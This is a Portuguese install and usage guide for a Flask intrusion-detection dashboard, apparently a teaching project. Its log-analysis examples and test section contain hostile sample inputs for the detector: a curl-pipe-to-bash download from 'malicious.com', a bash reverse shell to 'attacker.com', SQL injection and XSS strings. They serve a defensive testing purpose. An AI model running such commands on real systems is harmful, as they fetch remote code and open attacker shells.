# Guia de Instalação e Uso - IDS

## 🚀 Instalação Rápida (5 minutos)

### Requisitos de Sistema

- **Python**: 3.8 ou superior
- **pip**: Python package manager
- **Sistema Operacional**: Windows, macOS ou Linux
- **RAM**: Mínimo 512MB (recomendado 2GB)
- **Disco**: 100MB livres

### Passo 1: Clonar/Baixar Projeto

```bash
# Se usando git
git clone https://github.com/seu-usuario/ids-project.git
cd ids-project

# Ou simplesmente extrair o ZIP/arquivo
unzip ids-project.zip
cd ids-project
```

### Passo 2: Criar Ambiente Virtual (Recomendado)

```bash
# Windows
python -m venv venv
venv\Scripts\activate

# macOS/Linux
python3 -m venv venv
source venv/bin/activate
```

### Passo 3: Instalar Dependências

```bash
pip install -r requirements.txt
```

**Saída esperada:**
```
Collecting flask==2.3.3
  Downloading flask-2.3.3-py3-none-any.whl (101 kB)
  ✓ Successfully installed flask-2.3.3
Collecting flask-cors==4.0.0
  ✓ Successfully installed flask-cors-4.0.0
...
Successfully installed 4 packages
```

### Passo 4: Executar o Servidor

```bash
python app.py
```

**Saída esperada:**
```
╔══════════════════════════════════════════╗
║  IDS Web Server - SOC Dashboard          ║
║  Acesso: http://localhost:5000           ║
║  API: http://localhost:5000/api/...      ║
╚══════════════════════════════════════════╝

 * Serving Flask app 'app'
 * Debug mode: on
 * Running on http://127.0.0.1:5000
```

### Passo 5: Acessar Dashboard

Abra seu navegador e vá para:
```
http://localhost:5000
```

🎉 **Pronto! O IDS está rodando!**

---

## 📊 Usando o Dashboard

### Interface Principal

```
┌─────────────────────────────────────────────────────┐
│  🛡️ IDS Dashboard                                   │
│  Intrusion Detection System - SOC Monitoring       │
├─────────────────────────────────────────────────────┤
│  [▶ Iniciar] [⏹ Parar] [🔄 Atualizar] [📥 JSON] [📥 CSV] │
├─────────────────────────────────────────────────────┤
│  🔴 Crítico: 5  │ 🟠 Alto: 12  │ 🟡 Médio: 8  │ 🟢 Baixo: 3 │
├─────────────────────────────────────────────────────┤
│  [Detecções] [Analisar Log] [Estatísticas]         │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Detecção #1: SQL Injection - ALTA - 192.168.1.100│
│  Detecção #2: XSS Attack - ALTA - 10.0.0.50       │
│  Detecção #3: Brute Force SSH - MÉDIA - 192.168.1│
│                                                     │
└─────────────────────────────────────────────────────┘
```

### 1️⃣ Iniciar Simulador

Clique em **"▶ Iniciar Simulador"** para começar a gerar eventos de teste.

```
O sistema vai simular:
✓ Tentativas de SQL Injection
✓ Ataques XSS
✓ Brute Force SSH
✓ Scanning de portas
✓ Tentativas de privilege escalation
... a cada 2-5 segundos
```

Você verá as detecções aparecendo na lista em **tempo real**.

### 2️⃣ Interpretar as Detecções

Cada alerta mostra:

| Campo | Significado |
|-------|-------------|
| 🔴🟠🟡🟢 | Severidade (Crítico, Alto, Médio, Baixo) |
| Nome | Tipo de ataque detectado |
| IP | Endereço IP de origem |
| ⏰ | Horário do ataque |
| ● Ativo | Status da detecção |

### 3️⃣ Analisar Log Manualmente

Clique na aba **"Analisar Log"**:

1. Cole um log suspeito no campo de texto
2. (Opcional) Digite o IP de origem
3. Clique em **"Analisar"**

**Exemplo de Log para Testar:**

```bash
# SQL Injection
SELECT * FROM users WHERE id=1 UNION SELECT NULL, NULL, NULL

# XSS Attack
<script>alert('Hacked!')</script>

# Command Injection
curl http://malicious.com/malware.sh | bash

# Brute Force
Failed password for invalid user admin from 192.168.1.100 port 22

# Privilege Escalation
sudo -u root /bin/bash
```

Após analisar, você verá:
```
✅ Ameaças encontradas: 1

┌─────────────────────────────────┐
│ SQL Injection - ALTA             │
│ Tentativa de SQL Injection       │
│ detectada                         │
└─────────────────────────────────┘
```

### 4️⃣ Ver Estatísticas

Clique na aba **"Estatísticas"** para ver:

- 📊 Total de detecções
- 🔴 Contagem por severidade
- 📈 Top ameaças detectadas

```
Total de Detecções: 127

Por Severidade:
  • Crítico: 5
  • Alto: 25
  • Médio: 47
  • Baixo: 50

Top Ameaças:
  1. SQL Injection: 15
  2. XSS: 20
  3. Brute Force SSH: 8
  4. Port Scanning: 3
```

---

## 🔌 Usando a API via CLI

### Verificar Saúde do Sistema

```bash
curl http://localhost:5000/api/health
```

**Resposta:**
```json
{
  "status": "healthy",
  "uptime": "2024-01-15T10:30:45.123456",
  "detections_count": 127
}
```

### Listar Últimas Detecções

```bash
curl http://localhost:5000/api/detections?limit=10
```

### Filtrar por Severidade

```bash
curl "http://localhost:5000/api/detections?severity=critical&limit=5"
```

### Analisar um Log

```bash
curl -X POST http://localhost:5000/api/analyze \
  -H "Content-Type: application/json" \
  -d '{
    "log": "SELECT * FROM users WHERE id=1 UNION SELECT NULL",
    "source_ip": "192.168.1.100"
  }'
```

### Obter Estatísticas

```bash
curl http://localhost:5000/api/statistics
```

### Exportar Dados em JSON

```bash
curl http://localhost:5000/api/export?format=json > detections.json
```

### Exportar em CSV

```bash
curl http://localhost:5000/api/export?format=csv > detections.csv
```

---

## 🧪 Testando o IDS

### Teste 1: SQL Injection

**Pelo Dashboard:**
1. Vá para aba "Analisar Log"
2. Cole: `SELECT * FROM users WHERE id=1 UNION SELECT NULL`
3. Clique "Analisar"
4. Deve detectar "SQL Injection" como ALTA

**Via API:**
```bash
curl -X POST http://localhost:5000/api/analyze \
  -H "Content-Type: application/json" \
  -d '{"log": "SELECT * FROM users WHERE id=1 UNION SELECT NULL"}'
```

**Resultado esperado:**
```json
{
  "threats_found": 1,
  "detections": [
    {
      "threat_name": "SQL Injection",
      "severity": "high",
      "description": "Tentativa de SQL Injection detectada"
    }
  ]
}
```

### Teste 2: XSS Attack

```bash
curl -X POST http://localhost:5000/api/analyze \
  -H "Content-Type: application/json" \
  -d '{"log": "<script>alert(\"XSS\")</script>"}'
```

### Teste 3: Command Injection

```bash
curl -X POST http://localhost:5000/api/analyze \
  -H "Content-Type: application/json" \
  -d '{"log": "bash -i >& /dev/tcp/attacker.com/4444 0>&1"}'
```

### Teste 4: Brute Force SSH

```bash
curl -X POST http://localhost:5000/api/analyze \
  -H "Content-Type: application/json" \
  -d '{"log": "Failed password for invalid user admin from 192.168.1.100 port 22"}'
```

---

## 🔧 Configuração Avançada

### Adicionar Novas Assinaturas

Edite `ids_engine.py` e adicione na função `_load_signatures()`:

```python
ThreatSignature(
    "My Custom Threat",                    # Nome
    r"suspicious_pattern_here",            # Regex
    "high",                                # Severidade
    "Descrição do que detecta"             # Descrição
)
```

### Ajustar Threshold de Anomalias

Em `ids_engine.py`, método `detect_anomalies()`:

```python
# Alterar este valor (atualmente 10 requisições)
if count > 10:  # ← Alterar para detectar menos/mais anomalias
    anomalies.append(...)
```

### Habilitar Logging Persistente

Edite `app.py` para salvar detecções em arquivo:

```python
import json

def save_detections_to_file():
    with open("detections.json", "w") as f:
        json.dump(ids.detections, f, indent=2)

# Chamar periodicamente
@app.before_request
def save_periodically():
    if len(ids.detections) % 10 == 0:
        save_detections_to_file()
```

---

## ⚠️ Troubleshooting

### Problema: "Port 5000 already in use"

**Solução:**
```bash
# Windows: Encontre e mate o processo
netstat -ano | findstr :5000
taskkill /PID <PID> /F

# macOS/Linux:
lsof -i :5000
kill -9 <PID>

# Ou use outra porta:
python app.py --port 5001
```

### Problema: "ModuleNotFoundError: No module named 'flask'"

**Solução:**
```bash
# Certifique-se de ativar o venv
source venv/bin/activate  # macOS/Linux
# ou
venv\Scripts\activate     # Windows

# Reinstale dependências
pip install -r requirements.txt
```

### Problema: Dashboard não atualiza

**Solução:**
1. Limpe cache do navegador (Ctrl+Shift+Delete)
2. Abra em aba privada/incógnito
3. Verifique console do navegador (F12)

### Problema: Simulador não gera eventos

**Solução:**
```bash
# Verifique se o servidor está rodando
curl http://localhost:5000/api/health

# Inicie manualmente via API
curl -X POST http://localhost:5000/api/simulator/start

# Verifique logs do servidor
# Procure por erros no terminal onde rodou python app.py
```

---

## 📈 Casos de Uso

### 1. **Apresentação Acadêmica**

```
1. Rodar servidor
2. Iniciar simulador
3. Mostrar dashboard com detecções em tempo real
4. Demonstrar análise manual de logs
5. Exportar relatórios
```

### 2. **Treinamento de Segurança**

```
1. Explicar arquitetura SOC
2. Usar IDS para mostrar assinaturas de ataque
3. Fazer exercícios: "Identifique o tipo de ataque"
4. Discutir defesas apropriadas
```

### 3. **Teste de Conceitos**

```
1. Modificar padrões de ataque
2. Testar nova assinatura
3. Avaliar impacto de mudanças
4. Documentar resultados
```

### 4. **Prototipagem Rápida**

```
1. Usar como base para IDS customizado
2. Estender com regras específicas
3. Integrar com dados reais
4. Publicar em produção
```

---

## 📚 Próximos Passos

### Melhorias Sugeridas

1. **Persistência de Dados**
   - [ ] Integrar com PostgreSQL
   - [ ] Salvar detecções em BD

2. **Machine Learning**
   - [ ] Treinar modelo de anomalias
   - [ ] Detecção comportamental

3. **Escalabilidade**
   - [ ] Multi-threading
   - [ ] Clustering de IDS

4. **Integração**
   - [ ] Webhook para Slack
   - [ ] SIEM (Splunk/ELK)
   - [ ] Ticketing (Jira)

5. **Segurança**
   - [ ] Autenticação (Login)
   - [ ] HTTPS/TLS
   - [ ] Rate limiting

---

## 📞 Suporte e Documentação

**Documentos Disponíveis:**
- `README.md` - Visão geral do projeto
- `MANUAL_TECNICO.md` - Detalhes técnicos aprofundados
- `ANALISE_ATAQUES.md` - Casos de uso e análise de ataques

**Recursos Externos:**
- [NIST Cybersecurity Framework](https://www.nist.gov/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Snort IDS Documentation](https://www.snort.org/)

---

## ✅ Checklist de Primeiro Uso

- [ ] Python 3.8+ instalado
- [ ] Projeto baixado/clonado
- [ ] Ambiente virtual criado
- [ ] Dependências instaladas
- [ ] Servidor iniciado sem erros
- [ ] Dashboard acessível em localhost:5000
- [ ] Simulador iniciado com sucesso
- [ ] Detecções aparecendo em tempo real
- [ ] Teste de análise manual concluído
- [ ] Exportação de dados funcionando

---

**Versão**: 1.0.0  
**Última Atualização**: Janeiro 2024  
**Autor**: Seu Nome  
**Status**: ✅ Pronto para Uso

